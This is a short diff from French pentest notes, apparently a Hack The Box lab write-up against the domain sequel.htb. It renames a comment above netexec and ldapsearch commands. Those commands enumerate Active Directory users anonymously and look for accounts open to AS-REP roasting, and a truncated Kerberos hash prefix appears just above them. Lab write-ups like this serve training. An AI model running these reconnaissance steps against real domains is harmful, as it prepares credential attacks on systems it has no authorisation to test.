@@ -20,7 +20,7 @@ $krb5asrep$23$...
 ```
 
 ```bash 
-# Découverte
+# Enumération et découverte
 netexec ldap <DC_IP> -u '' -p '' --users
 netexec ldap sequel.htb -u '' -p '' --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
 ldapsearch -x -H ldap://<DC_IP> -b "DC=sequel,DC=htb" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName userAccountControl
